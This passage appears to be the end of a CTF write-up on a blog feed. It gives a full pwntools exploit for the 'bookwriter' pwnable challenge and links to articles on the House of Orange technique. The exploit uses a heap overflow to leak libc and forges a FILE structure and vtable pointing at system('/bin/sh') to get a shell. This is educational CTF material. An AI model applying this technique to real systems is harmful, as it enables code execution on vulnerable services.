<span class="n">exe</span> <span class="o">=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">context</span><span class="o">.</span><span class="n">binary</span> <span class="o">=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;bookwriter&#39;</span><span class="p">)</span>
<span class="n">pwn</span><span class="o">.</span><span class="n">context</span><span class="o">.</span><span class="n">delete_corefiles</span> <span class="o">=</span> <span class="kc">True</span>
<span class="n">pwn</span><span class="o">.</span><span class="n">context</span><span class="o">.</span><span class="n">rename_corefiles</span> <span class="o">=</span> <span class="kc">False</span>

<span class="n">host</span> <span class="o">=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">HOST</span> <span class="ow">or</span> <span class="s1">&#39;127.0.0.1&#39;</span>
<span class="n">port</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">pwn</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">PORT</span> <span class="ow">or</span> <span class="mi">1337</span><span class="p">)</span>


<span class="k">def</span> <span class="nf">local</span><span class="p">(</span><span class="n">argv</span><span class="o">=</span><span class="p">[],</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">):</span>
    <span class="s1">&#39;&#39;&#39;Execute the target binary locally&#39;&#39;&#39;</span>
    <span class="k">if</span> <span class="n">pwn</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">GDB</span><span class="p">:</span>
        <span class="k">return</span> <span class="n">pwn</span><span class="o">.</span><span class="n">gdb</span><span class="o">.</span><span class="n">debug</span><span class="p">([</span><span class="n">exe</span><span class="o">.</span><span class="n">path</span><span class="p">]</span> <span class="o">+</span> <span class="n">argv</span><span class="p">,</span> <span class="n">gdbscript</span><span class="o">=</span><span class="n">gdbscript</span><span class="p">,</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">)</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="k">return</span> <span class="n">pwn</span><span class="o">.</span><span class="n">process</span><span class="p">([</span><span class="n">exe</span><span class="o">.</span><span class="n">path</span><span class="p">]</span> <span class="o">+</span> <span class="n">argv</span><span class="p">,</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">)</span>


<span class="k">def</span> <span class="nf">remote</span><span class="p">(</span><span class="n">argv</span><span class="o">=</span><span class="p">[],</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">):</span>
    <span class="s1">&#39;&#39;&#39;Connect to the process on the remote host&#39;&#39;&#39;</span>
    <span class="n">io</span> <span class="o">=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">connect</span><span class="p">(</span><span class="n">host</span><span class="p">,</span> <span class="n">port</span><span class="p">)</span>
    <span class="k">if</span> <span class="n">pwn</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">GDB</span><span class="p">:</span>
        <span class="n">pwn</span><span class="o">.</span><span class="n">gdb</span><span class="o">.</span><span class="n">attach</span><span class="p">(</span><span class="n">io</span><span class="p">,</span> <span class="n">gdbscript</span><span class="o">=</span><span class="n">gdbscript</span><span class="p">)</span>
    <span class="k">return</span> <span class="n">io</span>


<span class="k">def</span> <span class="nf">start</span><span class="p">(</span><span class="n">argv</span><span class="o">=</span><span class="p">[],</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">):</span>
    <span class="s1">&#39;&#39;&#39;Start the exploit against the target.&#39;&#39;&#39;</span>
    <span class="k">if</span> <span class="n">pwn</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">LOCAL</span><span class="p">:</span>
        <span class="k">return</span> <span class="n">local</span><span class="p">(</span><span class="n">argv</span><span class="p">,</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">)</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="k">return</span> <span class="n">remote</span><span class="p">(</span><span class="n">argv</span><span class="p">,</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">)</span>


<span class="n">gdbscript</span> <span class="o">=</span> <span class="s1">&#39;&#39;&#39;
</span><span class="s1">source /home/nasm/Downloads/pwndbg/gdbinit.py
</span><span class="s1">b* main
</span><span class="s1">continue
</span><span class="s1">&#39;&#39;&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="o">**</span><span class="nb">locals</span><span class="p">())</span>

<span class="n">io</span> <span class="o">=</span> <span class="kc">None</span>

<span class="n">io</span> <span class="o">=</span> <span class="n">start</span><span class="p">()</span>

<span class="k">def</span> <span class="nf">set_author</span><span class="p">(</span><span class="n">name</span><span class="p">):</span>
    <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;Author :&#34;</span><span class="p">,</span> <span class="n">name</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">alloc</span><span class="p">(</span><span class="n">size</span><span class="p">,</span> <span class="n">content</span><span class="p">,</span> <span class="n">shell</span><span class="o">=</span><span class="kc">False</span><span class="p">):</span>
    <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;Your choice :&#34;</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;1&#34;</span><span class="p">)</span>
    <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;Size of page :&#34;</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">size</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
    
    <span class="k">if</span> <span class="n">shell</span> <span class="o">==</span> <span class="kc">True</span><span class="p">:</span>
        <span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>

    <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;Content :&#34;</span><span class="p">,</span> <span class="n">content</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">show</span><span class="p">(</span><span class="n">index</span><span class="p">):</span>
    <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;Your choice :&#34;</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;2&#34;</span><span class="p">)</span>
    <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;Index of page :&#34;</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">index</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>

    <span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;Content :</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">)</span>
    <span class="k">return</span> <span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;</span><span class="se">\n</span><span class="s2">-&#34;</span><span class="p">)[:</span><span class="o">-</span><span class="mi">2</span><span class="p">]</span>

<span class="k">def</span> <span class="nf">edit</span><span class="p">(</span><span class="n">idx</span><span class="p">,</span> <span class="n">content</span><span class="p">):</span>
    <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;Your choice :&#34;</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;3&#34;</span><span class="p">)</span>
    <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;Index of page :&#34;</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">idx</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
    <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;Content:&#34;</span><span class="p">,</span> <span class="n">content</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">info</span><span class="p">():</span>
    <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;Your choice :&#34;</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;4&#34;</span><span class="p">)</span>
    <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;Your choice :&#34;</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;4&#34;</span><span class="p">)</span>
    <span class="n">ret</span> <span class="o">=</span> <span class="n">io</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
    <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;(yes:1 / no:0) &#34;</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;0&#34;</span><span class="p">)</span>
    <span class="k">return</span> <span class="n">ret</span>

<span class="n">set_author</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;A&#34;</span><span class="o">*</span><span class="mh">0x40</span><span class="p">)</span>

<span class="n">alloc</span><span class="p">(</span><span class="mh">0x18</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;A&#34;</span><span class="o">*</span><span class="mh">0x18</span><span class="p">)</span>
<span class="n">edit</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;A&#34;</span><span class="o">*</span><span class="mh">0x18</span><span class="p">)</span>
<span class="n">edit</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;A&#34;</span><span class="o">*</span><span class="mh">0x18</span> <span class="o">+</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p16</span><span class="p">(</span><span class="mh">0xfe0</span> <span class="o">|</span> <span class="mh">0x1</span><span class="p">))</span>
<span class="c1"># overwrite top chunk size field</span>


<span class="n">alloc</span><span class="p">(</span><span class="mh">0xffff</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;&#34;</span><span class="p">)</span>
<span class="c1"># free top chunk</span>


<span class="c1"># leak libc</span>

<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">5</span><span class="p">):</span>
    <span class="n">alloc</span><span class="p">(</span><span class="mh">0x0</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;&#34;</span><span class="p">)</span>

<span class="n">heap</span> <span class="o">=</span> <span class="n">info</span><span class="p">()</span>
<span class="n">heap</span> <span class="o">=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">u64</span><span class="p">(</span><span class="n">heap</span><span class="p">[</span><span class="nb">len</span><span class="p">(</span><span class="s2">&#34;Author : AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#34;</span><span class="p">):][:</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x00</span><span class="s2">&#34;</span><span class="p">))</span> <span class="o">&amp;</span> <span class="o">~</span><span class="mh">0xfff</span>
<span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;heap: </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">heap</span><span class="p">)</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>

<span class="n">alloc</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;&#34;</span><span class="p">)</span>
<span class="n">libc</span> <span class="o">=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">u64</span><span class="p">(</span><span class="n">show</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x00</span><span class="s2">&#34;</span><span class="p">))</span> <span class="o">-</span> <span class="mh">0x3c4188</span> 
<span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;libc: </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">libc</span><span class="p">)</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>

<span class="n">edit</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;&#34;</span><span class="p">)</span>
<span class="n">alloc</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;&#34;</span><span class="p">)</span>
<span class="c1"># set top zero the first entry a size_array</span>


<span class="n">fake_vtable</span> <span class="o">=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">*</span> <span class="mi">3</span>
<span class="n">fake_vtable</span> <span class="o">+=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="n">libc</span> <span class="o">+</span> <span class="mh">0x45390</span><span class="p">)</span> <span class="c1"># &amp;system</span>

<span class="n">fake_file</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&#34;/bin/sh</span><span class="se">\00</span><span class="s2">&#34;</span>                <span class="c1"># _flags</span>

<span class="n">fake_file</span> <span class="o">+=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x61</span><span class="p">)</span>               <span class="c1"># _IO_read_ptr</span>
<span class="n">fake_file</span> <span class="o">+=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="n">libc</span> <span class="o">+</span> <span class="mh">0x1337</span><span class="p">)</span>    <span class="c1"># _IO_read_end</span>
<span class="c1">#fake_file += pwn.p64(libc + 0x3c3b78)    # _IO_read_end</span>
<span class="n">fake_file</span> <span class="o">+=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="n">libc</span> <span class="o">+</span> <span class="mh">0x3c4520</span> <span class="o">-</span> <span class="mh">0x10</span><span class="p">)</span> <span class="c1"># _IO_read_base = _IO_list_all - 0x10</span>
<span class="n">fake_file</span> <span class="o">+=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>                  <span class="c1"># _IO_write_base</span>
<span class="n">fake_file</span> <span class="o">+=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>                  <span class="c1"># _IO_write_ptr</span>
<span class="n">fake_file</span> <span class="o">+=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">*</span><span class="mi">18</span>               <span class="c1"># _IO_write_end ... __pad5</span>
<span class="n">fake_file</span> <span class="o">+=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p32</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>                  <span class="c1"># _mode</span>
<span class="n">fake_file</span> <span class="o">+=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p8</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">*</span><span class="mi">20</span>                <span class="c1"># _unused2</span>
<span class="n">fake_file</span> <span class="o">+=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="n">heap</span> <span class="o">+</span> <span class="mh">0xd0</span><span class="p">)</span> <span class="c1"># </span>

<span class="n">edit</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="p">(</span><span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">*</span><span class="mi">3</span> <span class="o">+</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x21</span><span class="p">))</span> <span class="o">*</span> <span class="mi">6</span> <span class="o">+</span> <span class="n">fake_vtable</span> <span class="o">+</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">*</span><span class="mi">2</span> <span class="o">+</span> <span class="n">fake_file</span><span class="p">)</span>
<span class="n">edit</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;&#34;</span><span class="p">)</span>

<span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;choice&#34;</span><span class="p">)</span>
<span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;choice&#34;</span><span class="p">)</span>

<span class="n">alloc</span><span class="p">(</span><span class="mh">0xffff</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="n">shell</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
</code></pre></div><ul>
<li><a
  class="gblog-markdown__link"
  href="https://1ce0ear.github.io/2017/11/26/study-house-of-orange/"
  
  >Very good article about house of Orange</a
></li>
<li><a
  class="gblog-markdown__link"
  href="https://1ce0ear.github.io/2017/09/25/File-Stream-Pointer-Overflow1/"
  
  >Article about FILE structure</a
></li>
<li><a
  class="gblog-markdown__link"
  href="https://elixir.bootlin.com/glibc/glibc-2.23/source/malloc/malloc.c#L4988"
  
  >libc source code on bootlin</a
></li>
</ul>
]]></content>
            
                 
                    
                         
                        
                            
                             
                                <category scheme="https://nasm.re/authors/nasm" term="nasm" label="nasm" />
                            
                        
                    
                 
                    
                         
                        
                            
                             
                                <category scheme="https://nasm.re/tags/ctf" term="ctf" label="ctf" />
                             
                                <category scheme="https://nasm.re/tags/pwnable" term="pwnable" label="pwnable" />
                            
                        
                    
                
            
        </entry>
    
</feed>
